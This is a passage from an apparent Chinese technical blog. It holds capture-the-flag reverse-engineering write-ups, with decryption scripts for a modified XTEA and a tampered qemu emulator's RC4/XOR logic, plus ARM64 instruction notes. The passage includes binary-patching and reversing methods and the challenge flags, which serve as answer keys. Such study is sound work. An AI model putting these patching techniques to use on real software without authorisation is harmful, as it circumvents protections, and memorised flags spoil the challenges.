0x69, 0xF4, 0xE4, 0x40, 0x4C, 0xD0, 0x2C, 0xE8, 0xF4, 0x3B,        0xF4, 0xB4, 0xB4, 0xB4, 0x38, 0x4A, 0xC0, 0xE4, 0x2B, 0xF4, 0xB4, 0xB4, 0xB4, 0x38, 0x4A, 0x50,        0xD4, 0x4C, 0x79, 0x85, 0x37, 0xD0, 0xD2, 0xF4, 0x5B, 0xF4, 0xB4, 0xB4, 0xB4, 0x38, 0x4A, 0xE1,        0xD4, 0x4C, 0xF9, 0x05, 0x37, 0xD0, 0x62, 0x04, 0xE3, 0x60, 0x5B, 0xF4, 0xB4, 0xB4, 0xB4, 0x38,        0x4A, 0xE1, 0xD4, 0xE4, 0x79, 0x05, 0x37, 0x4C, 0xE9, 0xF4, 0xD0, 0x62, 0x64, 0xCC, 0xE2, 0xE4,        0x4C, 0xE1, 0x4C, 0xF9, 0xED, 0x38, 0xF8, 0x4C, 0xE8, 0xF4, 0xF8, 0xE4, 0xE0, 0xA8, 0x4C, 0xC1,        0xE3, 0x60, 0xE4, 0x79, 0x04, 0x37, 0x4C, 0xD0, 0x2B, 0xF4, 0xB4, 0xB4, 0xB4, 0x38, 0x4A, 0x50,        0xE4, 0x2C, 0xF8, 0x85, 0x37, 0x52, 0x54, 0x2F, 0x2F, 0x2F, 0x3B, 0xF4, 0xB4, 0xB4, 0xB4, 0x38,        0x4A, 0xC0, 0xB4, 0x2B, 0xF4, 0xB4, 0xB4, 0xB4, 0x38, 0x4A, 0x50, 0xD4, 0x4C, 0x79, 0x85, 0x37,        0x4C, 0xF8, 0x04, 0x37, 0xE3, 0xD0, 0x2B, 0xF4, 0xB4, 0xB4, 0xB4, 0x38, 0x4A, 0x50, 0xB4, 0x2C,        0xF8, 0x85, 0x37, 0x3B, 0xF4, 0xB4, 0xB4, 0xB4, 0x38, 0x4A, 0xC0, 0xC4, 0x2B, 0xF4, 0xB4, 0xB4,        0xB4, 0x38, 0x4A, 0x50, 0xE4, 0x4C, 0x79, 0x85, 0x37, 0x4C, 0xF8, 0x04, 0x37, 0xE3, 0xD0, 0x2B,        0xF4, 0xB4, 0xB4, 0xB4, 0x38, 0x4A, 0x50, 0xC4, 0x2C, 0xF8, 0x85, 0x37, 0x3B, 0xF4, 0xB4, 0xB4,        0xB4, 0x38, 0x4A, 0xC0, 0xE4, 0x2B, 0xF4, 0xB4, 0xB4, 0xB4, 0x38, 0x4A, 0x50, 0xB4, 0x4C, 0x79,        0x85, 0x37, 0x4C, 0xF8, 0x04, 0x37, 0xE3, 0xD0, 0x2B, 0xF4, 0xB4, 0xB4, 0xB4, 0x38, 0x4A, 0x50,        0xE4, 0x2C, 0xF8, 0x85, 0x37, 0x3B, 0xF4, 0xB4, 0xB4, 0xB4, 0x38, 0x4A, 0xC0, 0xC4, 0x2B, 0xF4,        0xB4, 0xB4, 0xB4, 0x38, 0x4A, 0x50, 0xD4, 0x4C, 0x79, 0x85, 0x37, 0x4C, 0xF8, 0x04, 0x37, 0xE3,        0xD0, 0x2B, 0xF4, 0xB4, 0xB4, 0xB4, 0x38, 0x4A, 0x50, 0xD4, 0x2C, 0xF8, 0x85, 0x37, 0xA0, 0xEC,        0x42, 0xB4, 0xB4, 0xB4, 0x3D, 0xA0, 0xEC, 0x52, 0xB4, 0xB4, 0xB4, 0xBE, 0xA0, 0xEC, 0x62, 0xB4,        0xB4, 0xB4, 0x51, 0xA0, 0xEC, 0x6F, 0xB4, 0xB4, 0xB4, 0x3D, 0xA0, 0xEC, 0x7F, 0xB4, 0xB4, 0xB4,        0x5B, 0xA0, 0xEC, 0x12, 0xB4, 0xB4, 0xB4, 0x8D, 0xA0, 0xEC, 0x22, 0xB4, 0xB4, 0xB4, 0x65, 0xA0,        0xEC, 0x32, 0xB4, 0xB4, 0xB4, 0xA7, 0xA0, 0xEC, 0xBF, 0xB4, 0xB4, 0xB4, 0x4D, 0xA0, 0xEC, 0xCF,        0xB4, 0xB4, 0xB4, 0xAC, 0xA0, 0xEC, 0xDF, 0xB4, 0xB4, 0xB4, 0xF8, 0xA0, 0xEC, 0xEF, 0xB4, 0xB4,        0xB4, 0x06, 0xA0, 0xEC, 0xFF, 0xB4, 0xB4, 0xB4, 0xE9, 0xA0, 0xEC, 0x8F, 0xB4, 0xB4, 0xB4, 0x3B,        0xA0, 0xEC, 0x9F, 0xB4, 0xB4, 0xB4, 0xA3, 0xA0, 0xEC, 0xAF, 0xB4, 0xB4, 0xB4, 0x31, 0xB0, 0xEC,        0xF5, 0xC4, 0xB4, 0xB4, 0xB4, 0xB4, 0xB4, 0xB4, 0x6F, 0x14, 0x4C, 0xEC, 0xF5, 0xC4, 0xB4, 0xB4,        0x2F, 0xC0, 0x2C, 0xEC, 0xF5, 0xC4, 0xB4, 0xB4, 0xCC, 0x6C, 0xF5, 0xC4, 0xB4, 0xB4, 0xB5, 0x68,        0xE6, 0x38, 0xCA, 0xEC, 0xF5, 0xC4, 0xB4, 0xB4, 0x24, 0x1B, 0xF8, 0x04, 0x37, 0x38, 0xCA, 0x6D,        0xF5, 0xC4, 0xB4, 0xB4, 0x24, 0x1B, 0x7D, 0x85, 0x42, 0xB4, 0xB4, 0xB4, 0x63, 0xD0, 0xF7, 0xF4,        0xD3, 0xC0, 0x6F, 0xF4, 0x6F, 0x00, 0xBB, 0xC4, 0x38, 0x4C, 0x3F, 0xBD, 0xBD, 0xBD, 0xBD, 0xBD};uint8 *map_data;unsigned char tmp_map[1152]={};std::string charArrayToHex(uint8* input, size_t size) {    std::stringstream hexStream;    hexStream &lt;&lt; std::hex &lt;&lt; std::setfill('0');    for (size_t i = 0; i &lt; size; ++i) {        hexStream &lt;&lt; std::setw(2) &lt;&lt; static_cast&lt;int&gt;(static_cast&lt;unsigned char&gt;(input[i]));    }    return hexStream.str();}int main() {    int n = 1152;    map_data = (uint8 *) malloc(n);    int rounds = 0;    while (true) {        rounds++;        srand(0xDEADBEEF);        memcpy(map_data, map_data_orig, n);        // 测试用例        vector&lt;pair&lt;int, int&gt;&gt; fruits;        for (int i = 0; i &lt; rounds; ++i) {            int y = rand() % 20;            int x = rand() % 20;            fruits.push_back({x, y});//            cout &lt;&lt; x &lt;&lt; \" \" &lt;&lt; y &lt;&lt; \"\\n\";        }        SnakePathFinder pathFinder(fruits);        vector&lt;uint8&gt; v;        v.push_back(0x11);        v.push_back(0x12);        string path = pathFinder.findOptimalPath(10, 10, RIGHT);        for (char p : path) {            if(p == 'D')            {                for(int i=0;i&lt;n;i++)                {                    map_data[i] += 30;                }            }            else if(p == 'A'){                for(int i=0;i&lt;n;i++)                {                    tmp_map[i] = map_data[i];                }                for(int i=0;i&lt;n;i++)                {                    map_data[i] = tmp_map[(i+6)%n];                }            }            else if(p == 'S')            {                for(int i=0;i&lt;n;i++){                    map_data[i]=(map_data[i]&gt;&gt;5)|(map_data[i]&lt;&lt;3);                }            }            else if(p == 'W'){                for(int i=0;i&lt;n;i++){                    map_data[i]-=102;                }            }        }        MD5 md5 = MD5(map_data, n);        string hexd = md5.toStr();        cout &lt;&lt; \"round:\" &lt;&lt; rounds &lt;&lt; \" way: \" &lt;&lt; path &lt;&lt; \" md5: \" &lt;&lt; hexd &lt;&lt; \" \";        if (hexd == \"9c06c08f882d7981e91d663364ce5e2e\") {            cout &lt;&lt; \"found it\" &lt;&lt;  \"\\n\";            cout &lt;&lt; charArrayToHex(map_data, n);            exit(0);        } else {            cout &lt;&lt; \"nop\\n\";        }        if (rounds &gt; 1000) break;    }    return 0;}\n\nround:1 way: W md5: 62c753a165784d502246b51539f63797 nopround:2 way: WAS md5: ddf7a36ef6ee6dfc6dc91aad5d0dd21d nopround:3 way: WASA md5: 0f27f5aff365ec905bd9a5e4c60cd8b3 nopround:4 way: WASAWD md5: 9581209074985da9fa69047ce954c589 nopround:5 way: WASAWDSA md5: 6d87d9bc85ccf44e938dcb242d6baee3 nopround:6 way: WASAWDSAW md5: 30e6d405dd4d5e5af6d41f7ec1b1ab43 nopround:7 way: WASAWDSAWD md5: 587264015d204347a510bf2c72723097 nopround:8 way: WASAWDSAWDS md5: 6e3ab0e912c25e56c4283a011f2d2207 nopround:9 way: WASAWDSAWDSAW md5: 0a7b22abe33900efc2ae7f25f9950bb5 nopround:10 way: WASAWDSAWDSAWDS md5: 9c06c08f882d7981e91d663364ce5e2e found it48894c240855574881ec18020000488d6c2420488d7c2420b94e000000b8ccccccccf3ab488b8c2438020000c7450400000000c74524b979379eb804000000486bc000c744054857333163b804000000486bc001c7440548306d332eb804000000486bc002c744054820322051b804000000486bc003c744054857427338b804000000486bc000b904000000486bc900488b95100200008b040289440d78b804000000486bc001b904000000486bc901488b95100200008b040289440d78b804000000486bc002b904000000486bc902488b95100200008b040289440d78b804000000486bc003b904000000486bc903488b95100200008b040289440d78c785a400000000000000eb0e8b85a4000000ffc08985a400000083bda4000000200f83db000000b804000000486bc000b904000000486bc9018b4c0d78c1e104ba04000000486bd2018b541578c1ea0533caba04000000486bd201034c15788b550483e2038bd28b549548448b45044403c2418bd033ca034c05788bc1b904000000486bc90089440d788b45248b4d0403c88bc1894504b804000000486bc001b904000000486bc9008b4c0d78c1e104ba04000000486bd2008b541578c1ea0533caba04000000486bd200034c15788b5504c1ea0b83e2038bd28b549548448b45044403c2418bd033ca034c05788bc1b904000000486bc90189440d78e90affffffc785c400000000000000eb0e8b85c4000000ffc08985c400000083bdc4000000200f83db000000b804000000486bc002b904000000486bc9038b4c0d78c1e104ba04000000486bd2038b541578c1ea0533caba04000000486bd203034c15788b550483e2038bd28b549548448b45044403c2418bd033ca034c05788bc1b904000000486bc90289440d788b45248b4d0403c88bc1894504b804000000486bc003b904000000486bc9028b4c0d78c1e104ba04000000486bd2028b541578c1ea0533caba04000000486bd202034c15788b5504c1ea0b83e2038bd28b549548448b45044403c2418bd033ca034c05788bc1b904000000486bc90389440d78e90affffffb804000000486bc000b904000000486bc9028b4c0d788b44057833c1b904000000486bc90089440d78b804000000486bc001b904000000486bc9038b4c0d788b44057833c1b904000000486bc90189440d78b804000000486bc003b904000000486bc9008b4c0d788b44057833c1b904000000486bc90389440d78b804000000486bc001b904000000486bc9028b4c0d788b44057833c1b904000000486bc90289440d78c685e800000098c685e9000000a0c685ea000000d9c685eb00000098c685ec000000bac685ed00000097c685ee0000001bc685ef00000071c685f00000009bc685f100000081c685f200000044c685f30000002fc685f400000055c685f5000000b8c685f600000037c685f7000000dfc7851401000000000000eb0e8b8514010000ffc089851401000083bd14010000107d25486385140100000fbe44057848638d140100000fbe8c0de80000003bc1740432c0eb04ebc4b001488bf890909090909090909090909090909090488bc7488da5f80100005f5dc3\n\n然后吧解出来内容直接用 IDA 分析，是个魔改 XTea + 异或，主要魔改点就是四个密文，前两个 delta 从 0开始加起，后两组的 delta 从 32 * delta 开始算起\n\n#include&lt;stdio.h&gt;int main() {    unsigned int enc[4] = {0x98d9a098,                           0x711b97ba,                           0x2f44819b,                           0xdf37b855};    int n = 4;    unsigned int key[4] = {0x63313357,                           0x2e336d30,                           0x51203220,                           0x38734257};    int i, j;    long sum = 0, delta = 0x9E3779B9;    enc[2] ^= enc[1];    enc[3] ^= enc[0];    enc[1] ^= enc[3];    enc[0] ^= enc[2];    for (i = 0; i &lt; n; i += 2) {        sum = (32 * delta * (i / 2 + 1));        for (j = 0; j &lt; 32; j++) {            enc[i + 1] -= (((enc[i] &gt;&gt; 5) ^ (16 * enc[i])) + enc[i]) ^ (key[((sum &gt;&gt; 11) &amp; 3)] + sum);//容易魔改            sum -= delta;            enc[i] -= (((enc[i + 1] &gt;&gt; 5) ^ (16 * enc[i + 1])) + enc[i + 1]) ^ (key[(sum &amp; 3)] + sum);//容易魔改        }    }    for (i = 0; i &lt; n; i++) {        for (j = 0; j &lt;= 3; j++) {            printf(\"%c\", (enc[i] &gt;&gt; (j * 8)) &amp; 0xFF);        }    }    return 0;}// flag{G0@d_Snake}\n\nmips一个魔改 qemu 题题目给了一个 mips 架构的 qemu-user-static，mips 本来是可以直接运行的，出题人给个模拟器，那么肯定是有怪的，观察到 emu 被出题人去符号了，所以先查字符串搜索到这是一个 qemu 6.2.0 的 user-static，然后拉一份源码自行编译 bindiff\n试过了许多优化等级，发现只有 -O0 的时候，符号还原率还有文件大小和题目给出的最相似编译命令 ../configure --extra-cflags=\"-O0\" --target-list=mips-linux-user\n然后 bindiff 就还原出了大部分的符号\n\n一开始想用 -g 选项直接调试 mips_bin，但是发现 原本的调试功能被作者去掉了，于是去分析\n\n\n在 0x000000000034B7A3 下找到了原本的 gdbserver_start，然后 patch 模拟器，打开调试功能\n\n\n\n\n然后使用 ./emu -g 1234 mips_bin2 打开gdb服务器，ida附加调试\n程序中还有一个 fork 会影响分析，虽然可以 patch 掉但是会导致 flag 验证结果错误。在分析过程中会发现一个比较简单的假 flag，如果不用模拟器，这个 flag 就是对的，那么想到应该是模拟器上做了手脚，单步调试，最后发现在 syscall 之前 输出内容并没有被修改，那么只能想到是 qemu 中的 do_syscall 被修改了\n\n\nwrite 的调用号是 0xFA4\n果不其然，这里有额外的逻辑通过交叉引用找到加密的逻辑\n\n\nsub_33D48E 是一个魔改的 RC4，其中还有一点花指令，让反编译不正常，修复后主要魔改在 RC4 最后一步的异或上\n\n然后是一个简单异或，异或的值在 qemu 中处理 fork() 指令的函数 do_fork() 中被修改了，所以说如果之前把 fork() patch掉了也会导致没法解出来\n\n\nsub_33D886 是一个换位函数，这里吧密文的 7,11 和 12,16 位进行了交换在了解所有加密逻辑后，写一个解密脚本\n#include &lt;iostream&gt;#include \"defs.h\"#include &lt;cstdint&gt;unsigned char a1[60] = {        0xA8, 0xAC, 0x36, 0x6A, 0xC4, 0x0A, 0x9A, 0xDC, 0x12, 0x48, 0xF2, 0x60, 0xCB, 0xCC, 0x3A, 0x5E,        0xF2, 0x63, 0x9C, 0x94, 0xF5, 0x48, 0xCD, 0x17, 0x82, 0xCD, 0xF7, 0x71, 0x9F, 0x36, 0xB4, 0x88,        0xAF, 0x5F, 0xDD, 0x64, 0x85, 0x96, 0xF7, 0x5E, 0xC4, 0x09, 0xAD, 0xDD, 0xAB, 0x16, 0x99, 0x60,        0x9B, 0xDE, 0xF5, 0x53, 0xC3, 0x21, 0xFC, 0x80, 0xF8, 0x10, 0xC7, 0x26};unsigned char byte_4020[6] = {        0x4F, 0x7D, 0x8E, 0x2B, 0x31, 0x9C};unsigned int enced[24] = {        0x000000C4, 0x000000EE, 0x0000003C, 0x000000BB, 0x000000E7, 0x000000FD, 0x00000067, 0x0000001D,        0x000000F8, 0x00000097, 0x00000068, 0x0000009D, 0x0000000B, 0x0000007F, 0x000000C7, 0x00000080,        0x000000DF, 0x000000F9, 0x0000004B, 0x000000A0, 0x00000046, 0x00000091, 0x00000000, 0x00000000};unsigned char byte_B9CA60[32] = {        0xDE, 0xAD, 0xBE, 0xEF, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00,        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 0x00};uint8_t reverse_operation(uint8_t v3) {    uint8_t temp = v3;    uint8_t part1 = (temp &amp; 0xC0) ^ 0xC0;  // High bits    uint8_t part2 = (temp &amp; 0x3F) ^ 0x3B;  // Low bits    uint8_t middle = (part1 &gt;&gt; 6) | (part2 &lt;&lt; 2);    uint8_t v2 = (middle &gt;&gt; 7) | (middle &lt;&lt; 1);    return v2;}char *__fastcall decrypt(unsigned char *a1){    int v1; // edx    unsigned __int8 v3; // [rsp+15h] [rbp-17Bh]    int i; // [rsp+18h] [rbp-178h]    int v5; // [rsp+1Ch] [rbp-174h]    unsigned int v6; // [rsp+20h] [rbp-170h]    int i_22; // [rsp+24h] [rbp-16Ch]    int j_t12; // [rsp+28h] [rbp-168h]    int j; // [rsp+2Ch] [rbp-164h]    int v10; // [rsp+30h] [rbp-160h]    int v11; // [rsp+34h] [rbp-15Ch]    int v12; // [rsp+3Ch] [rbp-154h]    const char *v13; // [rsp+40h] [rbp-150h]    char *v14; // [rsp+48h] [rbp-148h]    __int8 sbox[256]; // [rsp+80h] [rbp-110h] BYREF    __int16 v16; // [rsp+180h] [rbp-10h]    unsigned __int64 v17; // [rsp+188h] [rbp-8h]    memset(sbox, 0, sizeof(sbox));    v16 = 0;    for ( i = 0; i &lt;= 255; ++i )        sbox[i] = i;    v5 = 0;    v6 = 0;    v13 = \"6105t3\";    do    {        v10 = (unsigned __int8)sbox[v6];        v11 = (unsigned __int8)(v13++)[(int)(2 * (v6 / 6 - (((2863311531u * (unsigned __int64)v6) &gt;&gt; 32) &amp; 0xFFFFFFFC)))];        v5 += v10 + v11;        v1 = v6++;        sbox[v1] = sbox[(unsigned __int8)v5];        sbox[(unsigned __int8)v5] = v10;    }    while ( v6 != 256 );    i_22 = 0;    j_t12 = 0;    v14 = (char *) malloc(256LL);    for ( j = 0; j != 22; ++j )    {        v12 = (unsigned __int8)sbox[(unsigned __int8)++i_22];        j_t12 += v12;        sbox[(unsigned __int8)i_22] = sbox[(unsigned __int8)j_t12];        sbox[(unsigned __int8)j_t12] = v12;//        v3 = ((((a1[j] &lt;&lt; 7) | (a1[j] &gt;&gt; 1)) &lt;&lt; 6) ^ 0xC0 | (((a1[j] &lt;&lt; 7) | (a1[j] &gt;&gt; 1)) &gt;&gt; 2) ^ 0x3B) ^ 0xBE;//        v14[j] = sbox[(sbox[i_22] + v12)] ^ byte_B9CA60[j &amp; 3] ^ (((((16 * (((32 * v3) | (v3 &gt;&gt; 3)) ^ 0xAD)) | ((((32 * v3) | (v3 &gt;&gt; 3)) ^ 0xAD) &gt;&gt; 4)) ^ 0xDE) &gt;&gt; 5) | (8 * (((16 * (((32 * v3) | (v3 &gt;&gt; 3)) ^ 0xAD)) | ((((32 * v3) | (v3 &gt;&gt; 3)) ^ 0xAD) &gt;&gt; 4)) ^ 0xDE)));        uint8 step1 = a1[j] ^ sbox[(unsigned __int8)(sbox[(unsigned __int8)i_22] + v12)] ^ byte_B9CA60[j &amp; 3];        uint8 s1_p1 = step1 &gt;&gt; 3 | step1 &lt;&lt; 5;        s1_p1 ^= 0xDE;        s1_p1 = s1_p1 &lt;&lt; 4 | s1_p1 &gt;&gt; 4;        s1_p1 ^= 0xAD;        s1_p1 = s1_p1 &lt;&lt; 3 | s1_p1 &gt;&gt; 5;        uint8 v3 = s1_p1;        v3 ^= 0xBE;        uint8 dt = reverse_operation(v3);        printf(\"%c\", dt);    }    return v14;}int main() {    uint32 tmp = enced[12];    enced[12] = enced[16];    enced[16] = tmp;    tmp = enced[7];    enced[7] = enced[11];    enced[11] = tmp;    uint8 css[24];    for (int i = 0; i &lt; 22; ++i) {        enced[i] ^= 0xA;        css[i] = (uint8) enced[i];    }    decrypt(css);    return 0;}// flag{QeMu_r3v3rs3in9_h@ck6}\n","tags":["Reverse"]},{"title":"ARM64 汇编小记","url":"/2024/12/03/arm_study/","content":"记录一下几个指令用法\n\n\nLDRB 指令在ARM汇编指令中，LDRB（Load Register Byte）是一种用于加载单个字节数据到寄存器的指令。与LDR指令相比，LDRB会从内存中加载一个字节（8位）而不是一个字（32位）数据，同时支持零扩展（zero-extension）到32位寄存器中。\n指令格式LDRB &lt;Rd&gt;, [&lt;Rn&gt;, #&lt;offset&gt;]\n\n参数说明\nRd 目标寄存器，用于存储加载的字节值。\nRn 基址寄存器，提供内存地址。\noffset 可选的偏移量（立即数或寄存器），用于计算内存地址。\n\n工作原理计算地址：根据基址寄存器 Rn 和偏移量 offset 计算出目标内存地址。读取内存：从该地址读取一个字节数据。零扩展：将读取到的8位数据扩展为32位（高位填充为0），并存入目标寄存器 Rd。\n示例读取一个字节LDRB R0, [R1]\n\n从 R1 寄存器指向的内存地址读取一个字节，存入 R0 寄存器。\n加载的字节内容会被零扩展到32位。\n\n带偏移的加载LDRB R2, [R3, #4]\n\n从 R3 寄存器的地址加上偏移量 4 的内存地址读取一个字节，存入 R2。\n\n使用寄存器偏移LDRB R4, [R5, R6]\n\n使用 R5 作为基址，R6的值作为偏移量，读取目标地址的一个字节数据到 R4。\n\n使用场景\n读取存储在内存中的单字节数据，例如：\n处理字符串（ASCII字符）\n操作8位寄存器或标志位数据\n处理设备寄存器中的单字节数据\n\n\n\n注意事项零扩展：LDRB 会将读取的8位数据零扩展为32位。如果需要符号扩展，可以使用 LDRSB 指令。对齐要求：尽管加载一个字节不需要严格的对齐，但应确保基址和偏移的计算结果是有效的内存地址。内存访问异常：如果目标地址无效或不可访问，会引发数据访问异常。\nSXTB 指令在 ARM 汇编指令集中，SXTB（Sign Extend Byte） 是一种用于符号扩展的指令，它将一个 8 位的有符号值扩展为 32 位的有符号值。\n指令功能SXTB 会从指定寄存器的低 8 位中提取数据，并根据最高有效位（符号位）进行符号扩展：\n\n如果最高有效位（第 7 位）是 0，扩展为正数。\n如果最高有效位是 1，扩展为负数。\n\n结果会写入目标寄存器。\n指令格式SXTB &lt;Rd&gt;, &lt;Rm&gt; {, &lt;rotation&gt;}\n\n参数说明\nRd 目标寄存器，用于存储符号扩展后的 32 位值。\nRm 源寄存器，包含要扩展的 8 位数据。\nrotation（可选）：旋转操作，可以是 ROR #8, ROR #16 或 ROR #24，将源数据按指定位数旋转后再取低 8 位。\n\n工作原理提取源寄存器 Rm 的低 8 位数据。根据第 7 位（符号位）进行符号扩展：\n\n若符号位为 1，高位用 1 填充。\n若符号位为 0，高位用 0 填充。将扩展后的 32 位值存入目标寄存器 Rd。\n\n示例基本符号扩展SXTB R1, R0\n\n从 R0 的低 8 位提取值。\n根据符号位扩展为 32 位，并存入 R1。\n\n如果 R0 = 0xFFFFFF85（低 8 位是 0x85，符号位为 1），则：\n\n符号扩展后：R1 = 0xFFFFFF85（扩展为负数）。\n\n如果 R0 = 0x0000007F（低 8 位是 0x7F，符号位为 0），则：\n\n符号扩展后：R1 = 0x0000007F（扩展为正数）。\n\n带旋转的符号扩展SXTB R2, R3, ROR #8\n\n先将 R3 的值按右旋 8 位。\n然后从结果的低 8 位提取值并进行符号扩展，结果存入 R2。\n\n使用场景\n处理有符号的 8 位数据：如读取字符（char 类型）或 8 位寄存器数据。\n数据对齐和扩展：将单字节数据扩展为 32 位，方便与其他数据操作。\n符号正确性：确保符号位在扩展后保持一致，用于数学运算或逻辑操作。\n\n与其他指令的比较\nSXTB 符号扩展 8 位。\nUXTB 无符号扩展 8 位（高位填充 0）。\nLDRSB 从内存加载一个字节并符号扩展。\nMOV 不进行扩展，直接移动数据。\n\nSXTB 是 ARM 汇编中操作符号位的重要工具，适合处理 8 位有符号数据并将其扩展为 32 位值进行进一步的运算。\n在 ARM 汇编语言中，LDP（Load Pair of Registers） 是一种用于同时加载两个寄存器的指令。它是 ARM 架构（尤其是 ARMv8-A）中为优化性能而引入的一种指令，可以一次性从内存中加载两个连续存储的数据到寄存器对。\nLDP 指令指令功能\nLDP 指令从内存地址中加载两个连续的数据，分别存入两个目标寄存器。\n与单个加载指令（如 LDR）相比，LDP 提供了更高的内存访问效率，因为它在一次指令中完成了两次加载操作。\n\n指令格式LDP &lt;Rt&gt;, &lt;Rt2&gt;, [&lt;Rn&gt;{, #&lt;imm&gt;}]\n\n参数说明\nRt 第一个目标寄存器，用于存储第一个加载的数据。\nRt2 第二个目标寄存器，用于存储第二个加载的数据。\nRn 基址寄存器，提供内存的起始地址。\nimm（可选）：偏移量（字节数），用于从基址 Rn 计算内存地址，默认为 0。\n\n工作原理计算地址：从基址寄存器 Rn 计算出目标内存地址。如果指定了偏移量 imm，则将其加到 Rn 的值上。加载数据：\n\n从计算地址加载第一个值存入寄存器 Rt。\n从计算地址加上寄存器宽度（通常为 8 字节）的位置加载第二个值存入寄存器 Rt2。更新基址（可选）：在某些模式下（如 LDP 加更新地址），基址 Rn 的值会被更新。\n\n示例基本使用（无偏移）LDP X0, X1, [X2]\n\n从 X2 指向的内存地址加载两个 64 位数据：\n第一个数据存入 X0。\n第二个数据存入 X1。\n\n\n\n带偏移量LDP X3, X4, [X5, #16]\n\n从 X5 + 16 地址开始加载两个数据：\n第一个数据存入 X3。\n第二个数据存入 X4。\n\n\n\n加载后自动更新基址LDP X6, X7, [X8], #16\n\n从 X8 指向的地址加载两个数据：\n第一个数据存入 X6。\n第二个数据存入 X7。\n\n\n然后将 X8 的值加上偏移量 16，更新 X8。\n\n使用场景高效加载连续数据：LDP 可以一次性加载两个连续的内存数据，减少内存访问的次数。栈操作：\n\n从栈中加载两个寄存器数据：LDP X29, X30, [SP], #16\n（用于从栈恢复链寄存器和返回地址）数据处理：\n用于矩阵计算、加密解密等需要快速加载连续数据的场景。\n\n与其他指令的比较\nLDR 一次加载一个寄存器的数据。\nLDP 一次加载两个寄存器的数据，效率更高。\nSTP 存储寄存器对到内存的指令，与 LDP 相对。\n\n通过使用 LDP，可以减少指令数量和内存访问延迟，从而提升代码性能，是 ARM 汇编中非常常用的一种优化指令。\nCSEL 指令CSEL（Conditional Select）是 ARM 架构中用于实现条件选择的一条指令。它根据条件标志（由上一次指令的结果设置）来选择两个操作数之一，并将选择的结果存入目标寄存器。\n指令功能\nCSEL 是一种无分支条件执行指令，可以避免传统分支指令（如 B）可能引入的分支预测失误问题。\n根据指定的条件（Condition Code, CC），选择一个值存入目标寄存器。\n\n指令格式CSEL &lt;Rd&gt;, &lt;Rn&gt;, &lt;Rm&gt;, &lt;cond&gt;\n\n参数说明\nRd：目标寄存器，用于存储最终选择的值。\nRn：第一个源寄存器（条件满足时选择该值）。\nRm：第二个源寄存器（条件不满足时选择该值）。\ncond：条件码，指定选择 Rn 或 Rm 的条件。\n\n工作原理根据指定的条件码 cond，检查条件标志（由之前指令更新）。如果条件满足（cond 为真），将 Rn 的值存入 Rd。如果条件不满足（cond 为假），将 Rm 的值存入 Rd。\n条件码（cond）条件码是 4 位标志，常见的条件如下：\n\n\n\n条件码\n含义\n描述\n\n\n\nEQ\nEqual\n等于，零标志位（Z）为 1\n\n\nNE\nNot Equal\n不等于，零标志位（Z）为 0\n\n\nCS/HS\nCarry Set/Unsigned Higher or Same\n进位标志位（C）为 1\n\n\nCC/LO\nCarry Clear/Unsigned Lower\n进位标志位（C）为 0\n\n\nMI\nMinus\n负数，负标志位（N）为 1\n\n\nPL\nPlus\n正数或零，负标志位（N）为 0\n\n\nVS\nOverflow Set\n溢出标志位（V）为 1\n\n\nVC\nOverflow Clear\n溢出标志位（V）为 0\n\n\nHI\nUnsigned Higher\nC=1 且 Z=0\n\n\nLS\nUnsigned Lower or Same\nC=0 或 Z=1\n\n\nGE\nGreater or Equal\nN=V\n\n\nLT\nLess Than\nN≠V\n\n\nGT\nGreater Than\nZ=0 且 N=V\n\n\nLE\nLess or Equal\nZ=1 或 N≠V\n\n\nAL\nAlways\n总是执行\n\n\n示例条件选择CSEL X0, X1, X2, EQ\n\n如果条件标志 Z=1（EQ 条件成立），则将 X1 的值存入 X0。\n如果条件标志 Z=0（EQ 条件不成立），则将 X2 的值存入 X0。\n\n用于最大值计算CMP X3, X4          // 比较 X3 和 X4CSEL X5, X3, X4, GT // 如果 X3 &gt; X4，则选择 X3，否则选择 X4\n\n通过比较指令 CMP 更新条件标志。\nCSEL 根据比较结果选择较大的值存入 X5。\n\n条件选择替代分支传统的分支代码：\nCMP X6, X7B.GT greaterMOV X8, X7B donegreater:MOV X8, X6done:\n可以被简化为：\nCMP X6, X7CSEL X8, X6, X7, GT\n\n优势无分支延迟：CSEL 避免了传统分支指令可能引起的分支预测失败问题，从而提升性能。代码简洁：减少多条分支和跳转指令，优化指令数量。高效性：非常适合需要快速选择结果而不需要复杂逻辑的场景。\n相关指令\nCSINC 条件选择 + 增量操作。\nCSINV 条件选择 + 取反操作。\nCSNEG 条件选择 + 取负操作。\n\nCSEL 是 ARM 汇编中一个强大的条件操作指令，在高效实现条件逻辑和优化分支跳转时非常有用。\nUDIV 指令在 ARM 汇编中，UDIV 是用于无符号整数除法的指令。\n指令功能UDIV 指令计算两个寄存器中值的无符号整数商，并将结果存储到目标寄存器中。\n指令格式UDIV &lt;Rd&gt;, &lt;Rn&gt;, &lt;Rm&gt;\n\n参数说明\nRd 目标寄存器，用于存储结果（商）。\nRn 被除数（Dividend）。\nRm 除数（Divisor）。\n\n工作原理读取操作数：\n\n从寄存器 Rn 中读取被除数（无符号整数）。\n从寄存器 Rm 中读取除数（无符号整数）。执行无符号除法：\n计算 Rn ÷ Rm 的无符号商。存储结果：\n将计算的商存储到目标寄存器 Rd 中。\n\n示例基本用法UDIV X0, X1, X2\n\n将寄存器 X1（被除数）的值除以 X2（除数）的值。\n将结果（无符号商）存储到寄存器 X0。\n\n示例操作假设：\n\nX1 = 20\nX2 = 3\n\n执行：\nUDIV X0, X1, X2\n\n结果：\n\nX0 = 6 （整数商，忽略余数）。\n\n使用场景无符号整数运算：\n\n对非负整数进行除法操作。数组索引计算：\n在循环中计算步长或分区操作。处理无符号数据类型：\n常见于嵌入式系统和加密解密算法。\n\n注意事项除数为 0：\n\n如果 Rm = 0（除数为 0），行为未定义（UNPREDICTABLE）。\n在编写代码时应确保除数不为 0。\n\n无符号数据：\n\nUDIV 仅适用于无符号数据。如果需要对有符号数据进行除法，请使用 SDIV 指令。\n\n与其他指令的比较\nUDIV 无符号除法。\nSDIV 有符号除法。\nMUL 乘法（无符号/有符号）。\nSMULL 和 UMULL 64 位乘法扩展\n\nMSUB 指令在 ARM 汇编中，MSUB 是一种乘法并减法的指令，它的功能是先进行乘法运算，然后将结果从另一个值中减去。\n指令功能MSUB 计算以下数学公式：\nRd = Ra - (Rn * Rm)\n\n它会将两个操作数（Rn 和 